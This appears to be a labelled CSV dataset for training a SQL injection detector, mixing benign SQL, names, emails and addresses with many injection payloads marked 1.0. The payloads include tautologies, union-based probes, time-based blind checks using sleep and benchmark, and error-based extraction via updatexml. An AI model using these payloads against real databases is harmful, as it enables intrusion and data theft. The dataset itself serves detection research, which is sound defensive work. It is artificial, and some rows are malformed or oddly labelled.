Sentence,Label,Processed_Sentence
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",1.0,"select benchmark  (  0,md0  (  0x0c0d0   )    )    and    (    (   'fegp'  =  'fegp"
8arrascal485,0.0,0arrascal0
SELECT diagram ( s FROM actual RIGHT JOIN,0.0,select diagram ( s from actual right join
1' where 3701  =  3701 and 2006  =  2006,1.0,0' where 0  =  0 and 0  =  0
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",1.0,"0  )   and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )   and   (  0  =  0"
"1%""   )    )     )   union all select null,null--",1.0,"0%""   )    )     )   union all select null,null--"
5509890000000000,0.0,0
SELECT * FROM sight ORDER BY advice DESC,0.0,select * from sight order by advice desc
wyle@designworld.us,0.0,wyle@designworld.us
8363,0.0,0
2815170000000000,0.0,0
02624260y,0.0,0y
"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",1.0,"0""   )    )     )   and make_set  (  0  =  0,0  )   and    (    (     (  ""uhiy""  =  ""uhiy"
gambs galatioto,0.0,gambs galatioto
if  (  3490  =  4920  )   select 3490 else drop function hlzt--,1.0,if  (  0  =  0  )   select 0 else drop function hlzt--
SELECT * FROM courage  WHERE grow NOT LIKE '[thought]%',0.0,select * from courage  where grow not like '[thought]%'
43877,0.0,0
SELECT * FROM stick WHERE natural LIKE '%anything%',0.0,select * from stick where natural like '%anything%'
select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1.0,select * from users where id  =  0 or $ 0  =  0 or 0  =  0 -- 0
SELECT * FROM evidence WHERE then NOT LIKE 'memory%',0.0,select * from evidence where then not like 'memory%'
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """,1.0,"0%""   )    )    or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  )   and    (    (   ""%""  =  """
SELECT AVG ( plane )  FROM weather  SELECT SUM ( life ) ,0.0,select avg ( plane )  from weather  select sum ( life ) 
1' and 9198  =  9198--,1.0,0' and 0  =  0--
miremont@barnicesuv.th,0.0,miremont@barnicesuv.th
SELECT * FROM beginning ORDER BY flight DESC,0.0,select * from beginning order by flight desc
alm.ora,0.0,alm.ora
6h11a3rud9,0.0,0h0a0rud0
"  SELECT trunk,bare,speak FROM mirror LEFT JOIN Orders ON leader.streamID =  species.hearing ORDER BY feel.anything",0.0,"  select trunk,bare,speak from mirror left join orders on leader.streamid =  species.hearing order by feel.anything"
SELECT COUNT ( spoken )  FROM explanation,0.0,select count ( spoken )  from explanation
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1.0,"-0 union all select 0,0,0,0,0,0,0,0--"
desc,1.0,desc
SELECT * FROM anybody WHERE NOT truck = 'tone'  AND NOT zipper = 'build',0.0,select * from anybody where not truck = 'tone'  and not zipper = 'build'
SELECT * FROM simply FETCH FIRST 3 ROWS ONLY,0.0,select * from simply fetch first 0 rows only
"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1.0,"0   )    )    and 0  =  benchmark  (  0,md0  (  0x0d0   )    )   #"
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1.0," select * from users where id  =  0 or 0#""0 union select 0,version  (    )   -- 0"
SELECT COUNT ( ourselves ) FROM saw,0.0,select count ( ourselves ) from saw
"pl. finlandia, 58, 7?d",0.0,"pl. finlandia, 0, 0?d"
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",1.0,"0'  )   and make_set  (  0  =  0,0  )   and   (  'ojag'  =  'ojag"
select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
giertych,0.0,giertych
"  SELECT tableID AS ID, upper AS yesterday FROM future",0.0,"  select tableid as id, upper as yesterday from future"
"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0' where 0  =  0 and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
villanueva de huerva,0.0,villanueva de huerva
"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",1.0,"0'+  (  select luwn where 0  =  0 union all select null,null,null,null,null,null#"
"-5672%"" or 3825  =  9675--",1.0,"-0%"" or 0  =  0--"
35742173n,0.0,0n
cholewin,0.0,cholewin
22193,0.0,0
crespo bullones,0.0,crespo bullones
" SELECT * FROM express ORDER BY whispered ASC, plain DESC",0.0," select * from express order by whispered asc, plain desc"
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'front-page' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0.0,select wp_posts.* from wp_posts where 0 = 0 and wp_posts.post_name in  ( 'front-page' )  and  (  0  =  0  )  and wp_posts.post_type  =  'wp_template' and   (  (  wp_posts.post_status  =  'publish'  )  )   group by wp_posts.id order by wp_posts.post_date desc
"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",1.0,"0' in boolean mode  )   and elt  (  0  =  0,0  )  #"
hymen_israeli@aulahost.vc,0.0,hymen_israeli@aulahost.vc
"  SELECT mix,iron FROM least WHERE rear = 'terrible' UNION SELECT railroad, everybody FROM is",0.0,"  select mix,iron from least where rear = 'terrible' union select railroad, everybody from is"
"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1.0,"0'  )   where 0  =  0 and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  --"
SELECT TOP 3 * FROM news WHERE form = 'upon',0.0,select top 0 * from news where form = 'upon'
SELECT AVG ( circus ) FROM instead SELECT SUM ( secret ) ,0.0,select avg ( circus ) from instead select sum ( secret ) 
"calle ribadeo 78,",0.0,"calle ribadeo 0,"
SELECT parent ( s )  FROM gently LEFT JOIN,0.0,select parent ( s )  from gently left join
-6200%'   )    )    or 8077  =  4661,1.0,-0%'   )    )    or 0  =  0
em+buchada,0.0,em+buchada
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1.0,"0  )   and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )   and   (  0  =  0"
denno,0.0,denno
SELECT * FROM ever WHERE setting LIKE '%clean%',0.0,select * from ever where setting like '%clean%'
or 1  =  1 --,1.0,or 0  =  0 --
SELECT nearest ( s )  FROM cage SELECT eight ( s ) ,0.0,select nearest ( s )  from cage select eight ( s ) 
DELETE FROM former,0.0,delete from former
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1.0,"0'  )   and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  "
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1.0,"-0' union all select 0,0,0,0,0,0,0--"
femke,0.0,femke
"1"" where 7599  =  7599",1.0,"0"" where 0  =  0"
"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1.0,"0'   )    )    as clhk where 0  =  0 or   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )  --"
85009456f,0.0,0f
47343175k,0.0,0k
"iif  (  1157  =  4542,1,1/0  )  ",1.0,"iif  (  0  =  0,0,0/0  )  "
1'  )   where 8128  =  8128,1.0,0'  )   where 0  =  0
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'nepn'  =  'nepn",1.0,"0' or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )   and 'nepn'  =  'nepn"
17120,0.0,0
SELECT * FROM luck FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM daughter,0.0,select * from luck fetch first 0 percent rows onlyselect top 0 * from daughter
SELECT COUNT ( DISTINCT recent )  FROM mysterious,0.0,select count ( distinct recent )  from mysterious
6202740000000000,0.0,0
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",1.0,"0'   )    )    or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )   and    (    (   'hfqz'  =  'hfqz"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0 and    (    (   0  =  0"
"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1.0,"0   )    )    or benchmark  (  0,md0  (  0   )    )   #"
" select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1.0," select * from users where id  =  0 or   (  0  )    =  0 union select 0,banner from v$version where rownum  =  0 -- 0"
82818101t,0.0,0t
navarra,0.0,navarra
DELETE FROM frighten WHERE ordinary = 'fine',0.0,delete from frighten where ordinary = 'fine'
kiam,0.0,kiam
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",1.0,"0' or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and 'aytf' like 'aytf"
SELECT * FROM gun ORDER BY part DESC,0.0,select * from gun order by part desc
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1.0,"0""   )    )    or elt  (  0  =  0,sleep  (  0   )    )    and    (    (   ""chvi"" like ""chvi"
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0.0,select * from around fetch first 0 rows only select top 0 percent * from certainly
SELECT * FROM sets ORDER BY enjoy,0.0,select * from sets order by enjoy
SELECT COUNT ( both ) FROM divide,0.0,select count ( both ) from divide
"  SELECT * FROM replace WHERE subject IN  ( 'managed', 'past', 'name' )  ",0.0,"  select * from replace where subject in  ( 'managed', 'past', 'name' )  "
54430634f,0.0,0f
SELECT * FROM growth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM managed,0.0,select * from growth fetch first 0 rows only select top 0 percent * from managed
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",1.0,"-0%"" union all select 0,0,0,0,0,0,0#"
gentry.gast@luchalibremexicana.cat,0.0,gentry.gast@luchalibremexicana.cat
"1""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0""  )   as oztl where 0  =  0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",1.0,"0' in boolean mode  )   or 0  =  benchmark  (  0,md0  (  0x0a0   )    )   #"
bho,0.0,bho
 UPDATE would SET through = 'wrapped'WHERE family = 'film',0.0, update would set through = 'wrapped'where family = 'film'
4542200000000000,0.0,0
melosa,0.0,melosa
"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1.0,"0'+  (  select 'dbvq' where 0  =  0 or 0  =  benchmark  (  0,md0  (  0x0d0a0c   )    )   #"
SELECT * FROM bell WHERE you = 'nodded'  OR use = 'gave',0.0,select * from bell where you = 'nodded'  or use = 'gave'
trevetha,0.0,trevetha
dipscea,0.0,dipscea
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11451 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",1.0,"select * from generate_series  (  0,0,case when   (  0  =  0  )   then 0 else 0 end  )   limit 0--"
SELECT COUNT ( paintID ) FROM get,0.0,select count ( paintid ) from get
cicek0,0.0,cicek0
SELECT * FROM getting 3,0.0,select * from getting 0
reco+vero,0.0,reco+vero
"1%""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""%""  =  """,1.0,"0%""  )    (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from information_schema.system_users  )   and   (  ""%""  =  """
"1"" where 8635  =  8635 and 4595  =  4595#",1.0,"0"" where 0  =  0 and 0  =  0#"
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from voice where production between '0-0-0' and '0-0-0'
SELECT * FROM  ( SELECT hollow FROM actual ) ,0.0,select * from  ( select hollow from actual ) 
1'   )    )    as grne where 9003  =  9003 order by 1--,1.0,0'   )    )    as grne where 0  =  0 order by 0--
SELECT AVG ( grain ) FROM nine SELECT SUM ( kids ) ,0.0,select avg ( grain ) from nine select sum ( kids ) 
dirck,0.0,dirck
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1.0,"0  )   where 0  =  0 and 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",1.0,"0""   )    )    rlike sleep  (  0  )   and    (    (   ""fzlr""  =  ""fzlr"
1'   )    )     )   order by 1--,1.0,0'   )    )     )   order by 0--
"INSERT INTO town  ( off, principal, back )  VALUES  ( 'chose', 'missing', 'transportation' )  ",0.0,"insert into town  ( off, principal, back )  values  ( 'chose', 'missing', 'transportation' )  "
SELECT * FROM afraid WHERE rays = 'roar',0.0,select * from afraid where rays = 'roar'
ulldecona,0.0,ulldecona
29639,0.0,0
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",1.0,"0""  )   as lgxc where 0  =  0 union all select null,null,null,null,null,null,null,null#"
SELECT whispered ( s )  FROM care UNION ALL,0.0,select whispered ( s )  from care union all
1' in boolean mode  )   and 4595  =  4595#,1.0,0' in boolean mode  )   and 0  =  0#
SELECT nearby ( s )  FROM hay,0.0,select nearby ( s )  from hay
select   (  case when   (  8233  =  1074  )   then 8233 else 1/  (  select 0  )   end  )  --,1.0,select   (  case when   (  0  =  0  )   then 0 else 0/  (  select 0  )   end  )  --
"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1.0,"0  )   or 0  =  benchmark  (  0,md0  (  0x0d0a0c   )    )   #"
 ,1.0, 
almonacid de la cuba,0.0,almonacid de la cuba
SELECT * FROM arrange WHERE    NOT surprise = 'company',0.0,select * from arrange where    not surprise = 'company'
"   SELECT Employees.toward, COUNT ( Orders.onID )  AS swimmingFROM    ( OrdersINNER JOIN flow ON Orders.sisterID  =  Employees.courtID ) ",0.0,"   select employees.toward, count ( orders.onid )  as swimmingfrom    ( ordersinner join flow on orders.sisterid  =  employees.courtid ) "
salustio,0.0,salustio
seyler@miami-beach.gw,0.0,seyler@miami-beach.gw
"  UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe",0.0,"  update tomorrow set plant =  'or', city =  'nearer' where garden =  pipe"
11106027v,0.0,0v
"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",1.0,"-0'   )    )    union all select 0,0,0,0,0,0,0--"
1305900000000000,0.0,0
"INSERT INTO production  ( trouble, personal, dish )  VALUES  ( 'short', 'table', 'trunk' )  ",0.0,"insert into production  ( trouble, personal, dish )  values  ( 'short', 'table', 'trunk' )  "
"1""   )    )    as jmoy where 9676  =  9676 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1.0,"0""   )    )    as jmoy where 0  =  0 and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  --"
c/ rivera de los limonetes 98,0.0,c/ rivera de los limonetes 0
select   (  case when   (  8350  =  7872  )   then 8350 else 8350*  (  select 8350 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
silvina,0.0,silvina
SELECT MIN ( air )  AS refer FROM refused,0.0,select min ( air )  as refer from refused
techumbre,0.0,techumbre
raimulfo,0.0,raimulfo
SELECT COUNT ( DISTINCT expect )  FROM substance,0.0,select count ( distinct expect )  from substance
SELECT * FROM did WHERE wood BETWEEN west09/01/1996stomach AND doing15/31/1996manner,0.0,select * from did where wood between west0/0/0stomach and doing0/0/0manner
isaciar,0.0,isaciar
"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",1.0,"0""  )   as jtou where 0  =  0 and 0  =  0--"
SELECT * FROM earn,0.0,select * from earn
"-8797""   )    )    order by 1#",1.0,"-0""   )    )    order by 0#"
.espejo,0.0,.espejo
SELECT * FROM but,0.0,select * from but
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""0,"" or 0  =  0 -- 0"
SELECT option_value FROM wp_options WHERE option_name  =  'user_registration_email_setting_disable_email' LIMIT 1,0.0,select option_value from wp_options where option_name  =  'user_registration_email_setting_disable_email' limit 0
SELECT * FROM finish 3 SELECT * FROM pale,0.0,select * from finish 0 select * from pale
"   SELECT COUNT ( chamber ) , stock FROM know BY congress",0.0,"   select count ( chamber ) , stock from know by congress"
SELECT * FROM arrangement WHERE earlier  BETWEEN 10 AND 20,0.0,select * from arrangement where earlier  between 0 and 0
SELECT * FROM rush 3 SELECT * FROM anyway,0.0,select * from rush 0 select * from anyway
"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0"" where 0  =  0 and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from shot fetch first 0 percent rows only
tabaquera,0.0,tabaquera
SELECT * FROM this 3,0.0,select * from this 0
SELECT AVG ( opposite )  FROM strike  SELECT SUM ( excitement ) ,0.0,select avg ( opposite )  from strike  select sum ( excitement ) 
" SELECT CONCAT ( Address, "" "", PostalCode, "" "", City )  AS Address FROM  Customers;",0.0," select concat ( address, "" "", postalcode, "" "", city )  as address from  customers;"
1' where 2958  =  2958,1.0,0' where 0  =  0
1'+  (  select kzgg where 5070  =  5070,1.0,0'+  (  select kzgg where 0  =  0
""" or 1  =  1--",1.0,""" or 0  =  0--"
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1.0,"-0   )    )    as hxmq where 0  =  0 union all select 0,0--"
"INSERT INTO driven ( your, country, welcome, popular, salt, wherever )  VALUES  ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )  ",0.0,"insert into driven ( your, country, welcome, popular, salt, wherever )  values  ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )  "
taboada,0.0,taboada
SELECT * FROM island WHERE theory  BETWEEN 10 AND 20,0.0,select * from island where theory  between 0 and 0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,1.0,"select benchmark  (  0,md0  (  0x0c0d0   )    )    and   (  ""%""  =  """
espuna angullo,0.0,espuna angullo
"1'  )   union all select null,null,null,null,null,null,null,null,null#",1.0,"0'  )   union all select null,null,null,null,null,null,null,null,null#"
SELECT * FROM  ( SELECT black FROM of ) ,0.0,select * from  ( select black from of ) 
"   SELECT pleasant, affect, even FROM zoo WHERE meet  IS NULL",0.0,"   select pleasant, affect, even from zoo where meet  is null"
34361279s,0.0,0s
"-7941%'  )   union all select 6965,6965,6965,6965--",1.0,"-0%'  )   union all select 0,0,0,0--"
8322,0.0,0
SELECT * FROM love FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM tired,0.0,select * from love fetch first 0 rows only select top 0 percent * from tired
SELECT * FROM  ( SELECT wrapped FROM recall ) ,0.0,select * from  ( select wrapped from recall ) 
aborr-ascarse,0.0,aborr-ascarse
"-5355"" or make_set  (  9354  =  9354,7185  )  ",1.0,"-0"" or make_set  (  0  =  0,0  )  "
SELECT outer ( s )  FROM object SELECT waste ( s ) ,0.0,select outer ( s )  from object select waste ( s ) 
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",1.0,"0  )   and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and   (  0  =  0"
#NAME?,0.0,#name?
"1%"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1.0,"0%"" and 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and ""%""  =  """
9ei91n,0.0,0ei0n
SELECT * FROM bush FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM cookies,0.0,select * from bush fetch first 0 percent rows onlyselect top 0 * from cookies
"1%""  )   union all select null,null,null,null,null,null#",1.0,"0%""  )   union all select null,null,null,null,null,null#"
SELECT * FROM president,0.0,select * from president
"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised",1.0,"-0""  )   or 0  =  0 and   (  ""ised""  =  ""ised"
SELECT TOP 3 * FROM said,0.0,select top 0 * from said
SELECT several,0.0,select several
"-5591%""   )    )    order by 1--",1.0,"-0%""   )    )    order by 0--"
aguilar de bureba,0.0,aguilar de bureba
SELECT * FROM remember 3,0.0,select * from remember 0
SELECT * FROM apple WHERE phrase BETWEEN 'wonder' AND 'practical',0.0,select * from apple where phrase between 'wonder' and 'practical'
SELECT orange ( s )  FROM wing UNION ALL,0.0,select orange ( s )  from wing union all
23 OR 1  =  1,1.0,0 or 0  =  0
SELECT TOP 50 PERCENT * FROM form,0.0,select top 0 percent * from form
"1'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0'  )   and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0.0,select * from nose where zero = 'slope'  and city = 'muscle'
SELECT AVG ( direct ) FROM scared,0.0,select avg ( direct ) from scared
24324,0.0,0
bizantina,0.0,bizantina
7770,0.0,0
" select * from users where id  =  1 or ""@#"" or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""@#"" or 0  =  0 -- 0"
-8023' or 6872  =  6872,1.0,-0' or 0  =  0
"  UPDATE money SET biggest =  'section', City =  'fair' WHERE won =  model",0.0,"  update money set biggest =  'section', city =  'fair' where won =  model"
1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ',1.0,0%'   )    )    and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (   '%'  =  '
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",1.0,"select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0 and    (    (     (  '%'  =  '"
1'||  (  select 'qgnz' where 6446  =  6446,1.0,0'||  (  select 'qgnz' where 0  =  0
ha3fila,0.0,ha0fila
3814,0.0,0
SELECT * FROM accurate FETCH FIRST 3 ROWS ONLY,0.0,select * from accurate fetch first 0 rows only
"1""  )   as fgne where 7207  =  7207",1.0,"0""  )   as fgne where 0  =  0"
34844,0.0,0
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1.0,"0"" or updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )  "
pu128,0.0,pu0
guillen,0.0,guillen
SELECT * FROM gold WHERE greatly = 'consonant' LIMIT 3,0.0,select * from gold where greatly = 'consonant' limit 0
emesh,0.0,emesh
"SELECT * FROM means WHERE science BETWEEN ""leaving"" AND    ""title""",0.0,"select * from means where science between ""leaving"" and    ""title"""
SELECT * FROM nothing WHERE indeed = 'mass'  AND City = 'life',0.0,select * from nothing where indeed = 'mass'  and city = 'life'
